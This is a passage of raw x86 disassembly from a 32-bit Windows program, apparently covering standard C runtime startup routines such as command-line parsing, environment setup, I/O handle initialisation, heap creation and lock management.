  424cb2:	jmp    0x424ca5
  424cb4:	dec    eax
  424cb5:	jmp    0x424c98
  424cb7:	cmp    BYTE PTR [eax],0x0
  424cba:	je     0x424d7b
  424cc0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cc4:	je     0x424ccf
  424cc6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc9:	add    DWORD PTR [ebp+0x8],0x4
  424ccd:	mov    DWORD PTR [ecx],edi
  424ccf:	inc    DWORD PTR [ebx]
  424cd1:	xor    ebx,ebx
  424cd3:	inc    ebx
  424cd4:	xor    edx,edx
  424cd6:	jmp    0x424cda
  424cd8:	inc    eax
  424cd9:	inc    edx
  424cda:	cmp    BYTE PTR [eax],0x5c
  424cdd:	je     0x424cd8
  424cdf:	cmp    BYTE PTR [eax],0x22
  424ce2:	jne    0x424d0a
  424ce4:	test   dl,0x1
  424ce7:	jne    0x424d08
  424ce9:	cmp    DWORD PTR [ebp-0x4],0x0
  424ced:	je     0x424cfb
  424cef:	lea    ecx,[eax+0x1]
  424cf2:	cmp    BYTE PTR [ecx],0x22
  424cf5:	jne    0x424cfb
  424cf7:	mov    eax,ecx
  424cf9:	jmp    0x424cfd
  424cfb:	xor    ebx,ebx
  424cfd:	xor    ecx,ecx
  424cff:	cmp    DWORD PTR [ebp-0x4],ecx
  424d02:	sete   cl
  424d05:	mov    DWORD PTR [ebp-0x4],ecx
  424d08:	shr    edx,1
  424d0a:	test   edx,edx
  424d0c:	je     0x424d1b
  424d0e:	test   edi,edi
  424d10:	je     0x424d16
  424d12:	mov    BYTE PTR [edi],0x5c
  424d15:	inc    edi
  424d16:	inc    DWORD PTR [esi]
  424d18:	dec    edx
  424d19:	jne    0x424d0e
  424d1b:	mov    cl,BYTE PTR [eax]
  424d1d:	test   cl,cl
  424d1f:	je     0x424d69
  424d21:	cmp    DWORD PTR [ebp-0x4],0x0
  424d25:	jne    0x424d31
  424d27:	cmp    cl,0x20
  424d2a:	je     0x424d69
  424d2c:	cmp    cl,0x9
  424d2f:	je     0x424d69
  424d31:	test   ebx,ebx
  424d33:	je     0x424d63
  424d35:	test   edi,edi
  424d37:	je     0x424d52
  424d39:	movzx  edx,cl
  424d3c:	test   BYTE PTR [edx+0x45df21],0x4
  424d43:	je     0x424d4b
  424d45:	mov    BYTE PTR [edi],cl
  424d47:	inc    edi
  424d48:	inc    eax
  424d49:	inc    DWORD PTR [esi]
  424d4b:	mov    cl,BYTE PTR [eax]
  424d4d:	mov    BYTE PTR [edi],cl
  424d4f:	inc    edi
  424d50:	jmp    0x424d61
  424d52:	movzx  ecx,cl
  424d55:	test   BYTE PTR [ecx+0x45df21],0x4
  424d5c:	je     0x424d61
  424d5e:	inc    eax
  424d5f:	inc    DWORD PTR [esi]
  424d61:	inc    DWORD PTR [esi]
  424d63:	inc    eax
  424d64:	jmp    0x424cd1
  424d69:	test   edi,edi
  424d6b:	je     0x424d71
  424d6d:	and    BYTE PTR [edi],0x0
  424d70:	inc    edi
  424d71:	inc    DWORD PTR [esi]
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	jmp    0x424c9c
  424d7b:	mov    eax,DWORD PTR [ebp+0x8]
  424d7e:	test   eax,eax
  424d80:	je     0x424d85
  424d82:	and    DWORD PTR [eax],0x0
  424d85:	inc    DWORD PTR [ebx]
  424d87:	pop    edi
  424d88:	pop    ebx
  424d89:	leave  
  424d8a:	ret    
  424d8b:	push   ebp
  424d8c:	mov    ebp,esp
  424d8e:	push   ecx
  424d8f:	push   ecx
  424d90:	push   ebx
  424d91:	push   esi
  424d92:	push   edi
  424d93:	xor    edi,edi
  424d95:	cmp    DWORD PTR ds:0x45e26c,edi
  424d9b:	jne    0x424da2
  424d9d:	call   0x425f2c
  424da2:	and    BYTE PTR ds:0x45dc14,0x0
  424da9:	push   0x104
  424dae:	mov    esi,0x45db10
  424db3:	push   esi
  424db4:	push   edi
  424db5:	call   DWORD PTR ds:0x429068
  424dbb:	mov    eax,ds:0x45e274
  424dc0:	cmp    eax,edi
  424dc2:	mov    DWORD PTR ds:0x45daf4,esi
  424dc8:	je     0x424dd1
  424dca:	cmp    BYTE PTR [eax],0x0
  424dcd:	mov    ebx,eax
  424dcf:	jne    0x424dd3
  424dd1:	mov    ebx,esi
  424dd3:	lea    eax,[ebp-0x4]
  424dd6:	push   eax
  424dd7:	push   edi
  424dd8:	lea    esi,[ebp-0x8]
  424ddb:	xor    ecx,ecx
  424ddd:	mov    eax,ebx
  424ddf:	call   0x424c1f
  424de4:	mov    esi,DWORD PTR [ebp-0x4]
  424de7:	mov    eax,DWORD PTR [ebp-0x8]
  424dea:	shl    esi,0x2
  424ded:	add    eax,esi
  424def:	push   eax
  424df0:	call   0x426062
  424df5:	mov    edi,eax
  424df7:	add    esp,0xc
  424dfa:	test   edi,edi
  424dfc:	jne    0x424e03
  424dfe:	or     eax,0xffffffff
  424e01:	jmp    0x424e28
  424e03:	lea    eax,[ebp-0x4]
  424e06:	push   eax
  424e07:	lea    ecx,[esi+edi*1]
  424e0a:	push   edi
  424e0b:	lea    esi,[ebp-0x8]
  424e0e:	mov    eax,ebx
  424e10:	call   0x424c1f
  424e15:	mov    eax,DWORD PTR [ebp-0x4]
  424e18:	dec    eax
  424e19:	pop    ecx
  424e1a:	mov    ds:0x45dad8,eax
  424e1f:	pop    ecx
  424e20:	mov    DWORD PTR ds:0x45dadc,edi
  424e26:	xor    eax,eax
  424e28:	pop    edi
  424e29:	pop    esi
  424e2a:	pop    ebx
  424e2b:	leave  
  424e2c:	ret    
  424e2d:	push   ecx
  424e2e:	push   ecx
  424e2f:	mov    eax,ds:0x45dc18
  424e34:	push   ebx
  424e35:	push   ebp
  424e36:	push   esi
  424e37:	push   edi
  424e38:	mov    edi,DWORD PTR ds:0x429080
  424e3e:	xor    ebx,ebx
  424e40:	xor    esi,esi
  424e42:	cmp    eax,ebx
  424e44:	push   0x2
  424e46:	pop    ebp
  424e47:	jne    0x424e76
  424e49:	call   edi
  424e4b:	mov    esi,eax
  424e4d:	cmp    esi,ebx
  424e4f:	je     0x424e5d
  424e51:	mov    DWORD PTR ds:0x45dc18,0x1
  424e5b:	jmp    0x424e7b
  424e5d:	call   DWORD PTR ds:0x429044
  424e63:	cmp    eax,0x78
  424e66:	jne    0x424e71
  424e68:	mov    eax,ebp
  424e6a:	mov    ds:0x45dc18,eax
  424e6f:	jmp    0x424e76
  424e71:	mov    eax,ds:0x45dc18
  424e76:	cmp    eax,0x1
  424e79:	jne    0x424ef8
  424e7b:	cmp    esi,ebx
  424e7d:	jne    0x424e87
  424e7f:	call   edi
  424e81:	mov    esi,eax
  424e83:	cmp    esi,ebx
  424e85:	je     0x424f00
  424e87:	cmp    WORD PTR [esi],bx
  424e8a:	mov    eax,esi
  424e8c:	je     0x424e9c
  424e8e:	add    eax,ebp
  424e90:	cmp    WORD PTR [eax],bx
  424e93:	jne    0x424e8e
  424e95:	add    eax,ebp
  424e97:	cmp    WORD PTR [eax],bx
  424e9a:	jne    0x424e8e
  424e9c:	mov    edi,DWORD PTR ds:0x42907c
  424ea2:	push   ebx
  424ea3:	push   ebx
  424ea4:	push   ebx
  424ea5:	sub    eax,esi
  424ea7:	push   ebx
  424ea8:	sar    eax,1
  424eaa:	inc    eax
  424eab:	push   eax
  424eac:	push   esi
  424ead:	push   ebx
  424eae:	push   ebx
  424eaf:	mov    DWORD PTR [esp+0x34],eax
  424eb3:	call   edi
  424eb5:	mov    ebp,eax
  424eb7:	cmp    ebp,ebx
  424eb9:	je     0x424eed
  424ebb:	push   ebp
  424ebc:	call   0x426062
  424ec1:	cmp    eax,ebx
  424ec3:	pop    ecx
  424ec4:	mov    DWORD PTR [esp+0x10],eax
  424ec8:	je     0x424eed
  424eca:	push   ebx
  424ecb:	push   ebx
  424ecc:	push   ebp
  424ecd:	push   eax
  424ece:	push   DWORD PTR [esp+0x24]
  424ed2:	push   esi
  424ed3:	push   ebx
  424ed4:	push   ebx
  424ed5:	call   edi
  424ed7:	test   eax,eax
  424ed9:	jne    0x424ee9
  424edb:	push   DWORD PTR [esp+0x10]
  424edf:	call   0x425f4a
  424ee4:	pop    ecx
  424ee5:	mov    DWORD PTR [esp+0x10],ebx
  424ee9:	mov    ebx,DWORD PTR [esp+0x10]
  424eed:	push   esi
  424eee:	call   DWORD PTR ds:0x429078
  424ef4:	mov    eax,ebx
  424ef6:	jmp    0x424f48
  424ef8:	cmp    eax,ebp
  424efa:	je     0x424f04
  424efc:	cmp    eax,ebx
  424efe:	je     0x424f04
  424f00:	xor    eax,eax
  424f02:	jmp    0x424f48
  424f04:	call   DWORD PTR ds:0x429074
  424f0a:	mov    esi,eax
  424f0c:	cmp    esi,ebx
  424f0e:	je     0x424f00
  424f10:	cmp    BYTE PTR [esi],bl
  424f12:	je     0x424f1e
  424f14:	inc    eax
  424f15:	cmp    BYTE PTR [eax],bl
  424f17:	jne    0x424f14
  424f19:	inc    eax
  424f1a:	cmp    BYTE PTR [eax],bl
  424f1c:	jne    0x424f14
  424f1e:	sub    eax,esi
  424f20:	inc    eax
  424f21:	mov    ebp,eax
  424f23:	push   ebp
  424f24:	call   0x426062
  424f29:	mov    edi,eax
  424f2b:	cmp    edi,ebx
  424f2d:	pop    ecx
  424f2e:	jne    0x424f34
  424f30:	xor    edi,edi
  424f32:	jmp    0x424f3f
  424f34:	push   ebp
  424f35:	push   esi
  424f36:	push   edi
  424f37:	call   0x426080
  424f3c:	add    esp,0xc
  424f3f:	push   esi
  424f40:	call   DWORD PTR ds:0x429070
  424f46:	mov    eax,edi
  424f48:	pop    edi
  424f49:	pop    esi
  424f4a:	pop    ebp
  424f4b:	pop    ebx
  424f4c:	pop    ecx
  424f4d:	pop    ecx
  424f4e:	ret    
  424f4f:	sub    esp,0x48
  424f52:	push   ebx
  424f53:	mov    ebx,0x480
  424f58:	push   ebx
  424f59:	call   0x426062
  424f5e:	test   eax,eax
  424f60:	pop    ecx
  424f61:	jne    0x424f6b
  424f63:	or     eax,0xffffffff
  424f66:	jmp    0x425148
  424f6b:	mov    ds:0x45e160,eax
  424f70:	mov    DWORD PTR ds:0x45e148,0x20
  424f7a:	lea    ecx,[eax+0x480]
  424f80:	jmp    0x424fa0
  424f82:	and    BYTE PTR [eax+0x4],0x0
  424f86:	or     DWORD PTR [eax],0xffffffff
  424f89:	and    DWORD PTR [eax+0x8],0x0
  424f8d:	mov    BYTE PTR [eax+0x5],0xa
  424f91:	mov    ecx,DWORD PTR ds:0x45e160
  424f97:	add    eax,0x24
  424f9a:	add    ecx,0x480
  424fa0:	cmp    eax,ecx
  424fa2:	jb     0x424f82
  424fa4:	push   ebp
  424fa5:	push   esi
  424fa6:	push   edi
  424fa7:	lea    eax,[esp+0x14]
  424fab:	push   eax
  424fac:	call   DWORD PTR ds:0x42904c
  424fb2:	cmp    WORD PTR [esp+0x46],0x0
  424fb8:	je     0x4250a7
  424fbe:	mov    eax,DWORD PTR [esp+0x48]
  424fc2:	test   eax,eax
  424fc4:	je     0x4250a7
  424fca:	mov    edi,DWORD PTR [eax]
  424fcc:	lea    ebp,[eax+0x4]
  424fcf:	lea    eax,[edi+ebp*1]
  424fd2:	mov    DWORD PTR [esp+0x10],eax
  424fd6:	mov    eax,0x800
  424fdb:	cmp    edi,eax
  424fdd:	jl     0x424fe1
  424fdf:	mov    edi,eax
  424fe1:	cmp    DWORD PTR ds:0x45e148,edi
  424fe7:	jge    0x425037
  424fe9:	mov    esi,0x45e164
  424fee:	push   ebx
  424fef:	call   0x426062
  424ff4:	test   eax,eax
  424ff6:	pop    ecx
  424ff7:	je     0x425031
  424ff9:	add    DWORD PTR ds:0x45e148,0x20
  425000:	mov    DWORD PTR [esi],eax
  425002:	lea    ecx,[eax+0x480]
  425008:	jmp    0x425020
  42500a:	and    BYTE PTR [eax+0x4],0x0
  42500e:	or     DWORD PTR [eax],0xffffffff
  425011:	and    DWORD PTR [eax+0x8],0x0
  425015:	mov    BYTE PTR [eax+0x5],0xa
  425019:	mov    ecx,DWORD PTR [esi]
  42501b:	add    eax,0x24
  42501e:	add    ecx,ebx
  425020:	cmp    eax,ecx
  425022:	jb     0x42500a
  425024:	add    esi,0x4
  425027:	cmp    DWORD PTR ds:0x45e148,edi
  42502d:	jl     0x424fee
  42502f:	jmp    0x425037
  425031:	mov    edi,DWORD PTR ds:0x45e148
  425037:	xor    ebx,ebx
  425039:	test   edi,edi
  42503b:	jle    0x4250a7
  42503d:	mov    eax,DWORD PTR [esp+0x10]
  425041:	mov    eax,DWORD PTR [eax]
  425043:	cmp    eax,0xffffffff
  425046:	je     0x42509c
  425048:	mov    cl,BYTE PTR [ebp+0x0]
  42504b:	test   cl,0x1
  42504e:	je     0x42509c
  425050:	test   cl,0x8
  425053:	jne    0x425060
  425055:	push   eax
  425056:	call   DWORD PTR ds:0x429088
  42505c:	test   eax,eax
  42505e:	je     0x42509c
  425060:	mov    ecx,ebx
  425062:	mov    eax,ebx
  425064:	and    eax,0x1f
  425067:	lea    eax,[eax+eax*8]
  42506a:	sar    ecx,0x5
  42506d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425074:	lea    esi,[ecx+eax*4]
  425077:	mov    eax,DWORD PTR [esp+0x10]
  42507b:	mov    eax,DWORD PTR [eax]
  42507d:	mov    DWORD PTR [esi],eax
  42507f:	mov    al,BYTE PTR [ebp+0x0]
  425082:	mov    BYTE PTR [esi+0x4],al
  425085:	lea    eax,[esi+0xc]
  425088:	push   0xfa0
  42508d:	push   eax
  42508e:	call   0x4263cd
  425093:	test   eax,eax
  425095:	pop    ecx
  425096:	pop    ecx
  425097:	je     0x4250c7
  425099:	inc    DWORD PTR [esi+0x8]
  42509c:	add    DWORD PTR [esp+0x10],0x4
  4250a1:	inc    ebx
  4250a2:	inc    ebp
  4250a3:	cmp    ebx,edi
  4250a5:	jl     0x42503d
  4250a7:	xor    ebx,ebx
  4250a9:	mov    ecx,DWORD PTR ds:0x45e160
  4250af:	lea    eax,[ebx+ebx*8]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	cmp    DWORD PTR [esi],0xffffffff
  4250b8:	jne    0x425129
  4250ba:	test   ebx,ebx
  4250bc:	mov    BYTE PTR [esi+0x4],0x81
  4250c0:	jne    0x4250cc
  4250c2:	push   0xfffffff6
  4250c4:	pop    eax
  4250c5:	jmp    0x4250d6
  4250c7:	or     eax,0xffffffff
  4250ca:	jmp    0x425145
  4250cc:	mov    eax,ebx
  4250ce:	dec    eax
  4250cf:	neg    eax
  4250d1:	sbb    eax,eax
  4250d3:	add    eax,0xfffffff5
  4250d6:	push   eax
  4250d7:	call   DWORD PTR ds:0x429064
  4250dd:	mov    edi,eax
  4250df:	cmp    edi,0xffffffff
  4250e2:	je     0x425123
  4250e4:	push   edi
  4250e5:	call   DWORD PTR ds:0x429088
  4250eb:	test   eax,eax
  4250ed:	je     0x425123
  4250ef:	and    eax,0xff
  4250f4:	cmp    eax,0x2
  4250f7:	mov    DWORD PTR [esi],edi
  4250f9:	jne    0x425101
  4250fb:	or     BYTE PTR [esi+0x4],0x40
  4250ff:	jmp    0x42510a
  425101:	cmp    eax,0x3
  425104:	jne    0x42510a
  425106:	or     BYTE PTR [esi+0x4],0x8
  42510a:	lea    eax,[esi+0xc]
  42510d:	push   0xfa0
  425112:	push   eax
  425113:	call   0x4263cd
  425118:	test   eax,eax
  42511a:	pop    ecx
  42511b:	pop    ecx
  42511c:	je     0x4250c7
  42511e:	inc    DWORD PTR [esi+0x8]
  425121:	jmp    0x42512d
  425123:	or     BYTE PTR [esi+0x4],0x40
  425127:	jmp    0x42512d
  425129:	or     BYTE PTR [esi+0x4],0x80
  42512d:	inc    ebx
  42512e:	cmp    ebx,0x3
  425131:	jl     0x4250a9
  425137:	push   DWORD PTR ds:0x45e148
  42513d:	call   DWORD PTR ds:0x429084
  425143:	xor    eax,eax
  425145:	pop    edi
  425146:	pop    esi
  425147:	pop    ebp
  425148:	pop    ebx
  425149:	add    esp,0x48
  42514c:	ret    
  42514d:	push   0xc
  42514f:	push   0x4295b0
  425154:	call   0x425340
  425159:	mov    DWORD PTR [ebp-0x1c],0x42a008
  425160:	cmp    DWORD PTR [ebp-0x1c],0x42a008
  425167:	jae    0x42518b
  425169:	and    DWORD PTR [ebp-0x4],0x0
  42516d:	mov    eax,DWORD PTR [ebp-0x1c]
  425170:	mov    eax,DWORD PTR [eax]
  425172:	test   eax,eax
  425174:	je     0x425181
  425176:	call   eax
  425178:	jmp    0x425181
  42517a:	xor    eax,eax
  42517c:	inc    eax
  42517d:	ret    
  42517e:	mov    esp,DWORD PTR [ebp-0x18]
  425181:	or     DWORD PTR [ebp-0x4],0xffffffff
  425185:	add    DWORD PTR [ebp-0x1c],0x4
  425189:	jmp    0x425160
  42518b:	call   0x42537b
  425190:	ret    
  425191:	push   0xc
  425193:	push   0x4295c0
  425198:	call   0x425340
  42519d:	mov    DWORD PTR [ebp-0x1c],0x42a010
  4251a4:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  4251ab:	jae    0x4251cf
  4251ad:	and    DWORD PTR [ebp-0x4],0x0
  4251b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251b4:	mov    eax,DWORD PTR [eax]
  4251b6:	test   eax,eax
  4251b8:	je     0x4251c5
  4251ba:	call   eax
  4251bc:	jmp    0x4251c5
  4251be:	xor    eax,eax
  4251c0:	inc    eax
  4251c1:	ret    
  4251c2:	mov    esp,DWORD PTR [ebp-0x18]
  4251c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251c9:	add    DWORD PTR [ebp-0x1c],0x4
  4251cd:	jmp    0x4251a4
  4251cf:	call   0x42537b
  4251d4:	ret    
  4251d5:	call   0x425416
  4251da:	mov    eax,ds:0x45d304
  4251df:	cmp    eax,0xffffffff
  4251e2:	je     0x4251f2
  4251e4:	push   eax
  4251e5:	call   DWORD PTR ds:0x429090
  4251eb:	or     DWORD PTR ds:0x45d304,0xffffffff
  4251f2:	ret    
  4251f3:	push   ebx
  4251f4:	push   esi
  4251f5:	call   DWORD PTR ds:0x429044
  4251fb:	push   DWORD PTR ds:0x45d304
  425201:	mov    ebx,eax
  425203:	call   DWORD PTR ds:0x4290a0
  425209:	mov    esi,eax
  42520b:	test   esi,esi
  42520d:	jne    0x425258
  42520f:	push   0x88
  425214:	push   0x1
  425216:	call   0x426458
  42521b:	mov    esi,eax
  42521d:	test   esi,esi
  42521f:	pop    ecx
  425220:	pop    ecx
  425221:	je     0x425250
  425223:	push   esi
  425224:	push   DWORD PTR ds:0x45d304
  42522a:	call   DWORD PTR ds:0x42909c
  425230:	test   eax,eax
  425232:	je     0x425250
  425234:	mov    DWORD PTR [esi+0x54],0x45d258
  42523b:	mov    DWORD PTR [esi+0x14],0x1
  425242:	call   DWORD PTR ds:0x429098
  425248:	or     DWORD PTR [esi+0x4],0xffffffff
  42524c:	mov    DWORD PTR [esi],eax
  42524e:	jmp    0x425258
  425250:	push   0x10
  425252:	call   0x424406
  425257:	pop    ecx
  425258:	push   ebx
  425259:	call   DWORD PTR ds:0x429094
  42525f:	mov    eax,esi
  425261:	pop    esi
  425262:	pop    ebx
  425263:	ret    
  425264:	call   0x4253cd
  425269:	test   eax,eax
  42526b:	je     0x42527d
  42526d:	call   DWORD PTR ds:0x4290a4
  425273:	cmp    eax,0xffffffff
  425276:	mov    ds:0x45d304,eax
  42527b:	jne    0x425285
  42527d:	call   0x4251d5
  425282:	xor    eax,eax
  425284:	ret    
  425285:	push   esi
  425286:	push   0x88
  42528b:	push   0x1
  42528d:	call   0x426458
  425292:	mov    esi,eax
  425294:	test   esi,esi
  425296:	pop    ecx
  425297:	pop    ecx
  425298:	je     0x4252ca
  42529a:	push   esi
  42529b:	push   DWORD PTR ds:0x45d304
  4252a1:	call   DWORD PTR ds:0x42909c
  4252a7:	test   eax,eax
  4252a9:	je     0x4252ca
  4252ab:	mov    DWORD PTR [esi+0x54],0x45d258
  4252b2:	mov    DWORD PTR [esi+0x14],0x1
  4252b9:	call   DWORD PTR ds:0x429098
  4252bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252c3:	mov    DWORD PTR [esi],eax
  4252c5:	xor    eax,eax
  4252c7:	inc    eax
  4252c8:	pop    esi
  4252c9:	ret    
  4252ca:	call   0x4251d5
  4252cf:	xor    eax,eax
  4252d1:	pop    esi
  4252d2:	ret    
  4252d3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252da:	jne    0x4252e9
  4252dc:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252e3:	jb     0x4252e9
  4252e5:	xor    eax,eax
  4252e7:	inc    eax
  4252e8:	ret    
  4252e9:	push   0x3
  4252eb:	pop    eax
  4252ec:	ret    
  4252ed:	xor    eax,eax
  4252ef:	cmp    DWORD PTR [esp+0x4],eax
  4252f3:	push   0x0
  4252f5:	sete   al
  4252f8:	push   0x1000
  4252fd:	push   eax
  4252fe:	call   DWORD PTR ds:0x429034
  425304:	test   eax,eax
  425306:	mov    ds:0x45e140,eax
  42530b:	je     0x425337
  42530d:	call   0x4252d3
  425312:	cmp    eax,0x3
  425315:	mov    ds:0x45e144,eax
  42531a:	jne    0x42533a
  42531c:	push   0x3f8
  425321:	call   0x4266da
  425326:	test   eax,eax
  425328:	pop    ecx
  425329:	jne    0x42533a
  42532b:	push   DWORD PTR ds:0x45e140
  425331:	call   DWORD PTR ds:0x4290a8
  425337:	xor    eax,eax
  425339:	ret    
  42533a:	xor    eax,eax
  42533c:	inc    eax
  42533d:	ret    
  42533e:	int3   
  42533f:	int3   
  425340:	push   0x427208
  425345:	mov    eax,fs:0x0
  42534b:	push   eax
  42534c:	mov    eax,DWORD PTR [esp+0x10]
  425350:	mov    DWORD PTR [esp+0x10],ebp
  425354:	lea    ebp,[esp+0x10]
  425358:	sub    esp,eax
  42535a:	push   ebx
  42535b:	push   esi
  42535c:	push   edi
  42535d:	mov    eax,DWORD PTR [ebp-0x8]
  425360:	mov    DWORD PTR [ebp-0x18],esp
  425363:	push   eax
  425364:	mov    eax,DWORD PTR [ebp-0x4]
  425367:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42536e:	mov    DWORD PTR [ebp-0x8],eax
  425371:	lea    eax,[ebp-0x10]
  425374:	mov    fs:0x0,eax
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x10]
  42537e:	mov    DWORD PTR fs:0x0,ecx
  425385:	pop    ecx
  425386:	pop    edi
  425387:	pop    esi
  425388:	pop    ebx
  425389:	leave  
  42538a:	push   ecx
  42538b:	ret    
  42538c:	int3   
  42538d:	int3   
  42538e:	int3   
  42538f:	int3   
  425390:	cmp    eax,0x1000
  425395:	jae    0x4253a5
  425397:	neg    eax
  425399:	add    eax,esp
  42539b:	add    eax,0x4
  42539e:	test   DWORD PTR [eax],eax
  4253a0:	xchg   esp,eax
  4253a1:	mov    eax,DWORD PTR [eax]
  4253a3:	push   eax
  4253a4:	ret    
  4253a5:	push   ecx
  4253a6:	lea    ecx,[esp+0x8]
  4253aa:	sub    ecx,0x1000
  4253b0:	sub    eax,0x1000
  4253b5:	test   DWORD PTR [ecx],eax
  4253b7:	cmp    eax,0x1000
  4253bc:	jae    0x4253aa
  4253be:	sub    ecx,eax
  4253c0:	mov    eax,esp
  4253c2:	test   DWORD PTR [ecx],eax
  4253c4:	mov    esp,ecx
  4253c6:	mov    ecx,DWORD PTR [eax]
  4253c8:	mov    eax,DWORD PTR [eax+0x4]
  4253cb:	push   eax
  4253cc:	ret    
  4253cd:	push   esi
  4253ce:	push   edi
  4253cf:	xor    esi,esi
  4253d1:	mov    edi,0x45dc20
  4253d6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253de:	jne    0x4253fe
  4253e0:	lea    eax,[esi*8+0x45d310]
  4253e7:	mov    DWORD PTR [eax],edi
  4253e9:	push   0xfa0
  4253ee:	push   DWORD PTR [eax]
  4253f0:	add    edi,0x18
  4253f3:	call   0x4263cd
  4253f8:	test   eax,eax
  4253fa:	pop    ecx
  4253fb:	pop    ecx
  4253fc:	je     0x42540a
  4253fe:	inc    esi
  4253ff:	cmp    esi,0x24
  425402:	jl     0x4253d6
  425404:	xor    eax,eax
  425406:	inc    eax
  425407:	pop    edi
  425408:	pop    esi
  425409:	ret    
  42540a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425412:	xor    eax,eax
  425414:	jmp    0x425407
  425416:	push   ebx
  425417:	mov    ebx,DWORD PTR ds:0x42908c
  42541d:	push   esi
  42541e:	mov    esi,0x45d310
  425423:	push   edi
  425424:	mov    edi,DWORD PTR [esi]
  425426:	test   edi,edi
  425428:	je     0x42543d
  42542a:	cmp    DWORD PTR [esi+0x4],0x1
  42542e:	je     0x42543d
  425430:	push   edi
  425431:	call   ebx
  425433:	push   edi
  425434:	call   0x425f4a
  425439:	and    DWORD PTR [esi],0x0
  42543c:	pop    ecx
  42543d:	add    esi,0x8
  425440:	cmp    esi,0x45d430
  425446:	jl     0x425424
  425448:	mov    esi,0x45d310
  42544d:	pop    edi
  42544e:	mov    eax,DWORD PTR [esi]
  425450:	test   eax,eax
  425452:	je     0x42545d
  425454:	cmp    DWORD PTR [esi+0x4],0x1
  425458:	jne    0x42545d
  42545a:	push   eax
  42545b:	call   ebx
  42545d:	add    esi,0x8
  425460:	cmp    esi,0x45d430
  425466:	jl     0x42544e
  425468:	pop    esi
  425469:	pop    ebx
  42546a:	ret    
  42546b:	push   ebp
  42546c:	mov    ebp,esp
  42546e:	mov    eax,DWORD PTR [ebp+0x8]
  425471:	push   DWORD PTR [eax*8+0x45d310]
  425478:	call   DWORD PTR ds:0x4290b0
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   ebp
  425481:	mov    ebp,esp
  425483:	push   esi
  425484:	mov    esi,DWORD PTR [ebp+0x8]
  425487:	lea    esi,[esi*8+0x45d310]
  42548e:	cmp    DWORD PTR [esi],0x0
  425491:	je     0x425498
  425493:	xor    eax,eax
  425495:	inc    eax
  425496:	jmp    0x4254fc
  425498:	push   edi
  425499:	push   0x18
  42549b:	call   0x426062
  4254a0:	mov    edi,eax
  4254a2:	test   edi,edi
  4254a4:	pop    ecx
  4254a5:	jne    0x4254b6
  4254a7:	call   0x4272e0
  4254ac:	mov    DWORD PTR [eax],0xc
  4254b2:	xor    eax,eax
  4254b4:	jmp    0x4254fb
  4254b6:	push   0xa
  4254b8:	call   0x4254ff
  4254bd:	cmp    DWORD PTR [esi],0x0
  4254c0:	pop    ecx
  4254c1:	jne    0x4254e9
  4254c3:	push   0xfa0
  4254c8:	push   edi
  4254c9:	call   0x4263cd
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254e5
  4254d4:	push   edi
  4254d5:	call   0x425f4a
  4254da:	push   0xa
  4254dc:	call   0x42546b
  4254e1:	pop    ecx
  4254e2:	pop    ecx
  4254e3:	jmp    0x4254a7
  4254e5:	mov    DWORD PTR [esi],edi
  4254e7:	jmp    0x4254f0
  4254e9:	push   edi
  4254ea:	call   0x425f4a
  4254ef:	pop    ecx
  4254f0:	push   0xa
  4254f2:	call   0x42546b
  4254f7:	xor    eax,eax
  4254f9:	pop    ecx
  4254fa:	inc    eax
  4254fb:	pop    edi
  4254fc:	pop    esi
  4254fd:	pop    ebp
  4254fe:	ret    
  4254ff:	push   ebp
  425500:	mov    ebp,esp
  425502:	mov    eax,DWORD PTR [ebp+0x8]
  425505:	push   esi
  425506:	lea    esi,[eax*8+0x45d310]
  42550d:	cmp    DWORD PTR [esi],0x0
  425510:	jne    0x425525
  425512:	push   eax
  425513:	call   0x425480
  425518:	test   eax,eax
  42551a:	pop    ecx
  42551b:	jne    0x425525
  42551d:	push   0x11
  42551f:	call   0x424406
  425524:	pop    ecx
  425525:	push   DWORD PTR [esi]
  425527:	call   DWORD PTR ds:0x4290b4
  42552d:	pop    esi
  42552e:	pop    ebp
  42552f:	ret    
  425530:	push   esi
  425531:	push   DWORD PTR ds:0x45e268
  425537:	call   0x427496
  42553c:	pop    ecx
  42553d:	mov    ecx,DWORD PTR ds:0x45e264
  425543:	mov    esi,eax
  425545:	mov    eax,ds:0x45e268
  42554a:	mov    edx,ecx
  42554c:	sub    edx,eax
  42554e:	add    edx,0x4
  425551:	cmp    esi,edx
  425553:	jae    0x4255a3
  425555:	mov    ecx,0x800
  42555a:	cmp    esi,ecx
  42555c:	jae    0x425560
  42555e:	mov    ecx,esi
  425560:	add    ecx,esi
  425562:	push   ecx
  425563:	push   eax
  425564:	call   0x4272e9
  425569:	test   eax,eax
  42556b:	pop    ecx
  42556c:	pop    ecx
  42556d:	jne    0x425586
  42556f:	add    esi,0x10
  425572:	push   esi
  425573:	push   DWORD PTR ds:0x45e268
  425579:	call   0x4272e9
  42557e:	test   eax,eax
  425580:	pop    ecx
  425581:	pop    ecx
  425582:	jne    0x425586
  425584:	pop    esi
  425585:	ret    
  425586:	mov    ecx,DWORD PTR ds:0x45e264
  42558c:	sub    ecx,DWORD PTR ds:0x45e268
  425592:	mov    ds:0x45e268,eax
  425597:	sar    ecx,0x2
  42559a:	lea    ecx,[eax+ecx*4]
  42559d:	mov    DWORD PTR ds:0x45e264,ecx
  4255a3:	mov    DWORD PTR [ecx],edi
  4255a5:	add    DWORD PTR ds:0x45e264,0x4
  4255ac:	mov    eax,edi
  4255ae:	pop    esi
  4255af:	ret    
  4255b0:	push   0x80
  4255b5:	call   0x426062
  4255ba:	test   eax,eax
  4255bc:	pop    ecx
  4255bd:	mov    ds:0x45e268,eax
  4255c2:	jne    0x4255c8
  4255c4:	push   0x18
  4255c6:	pop    eax
  4255c7:	ret    
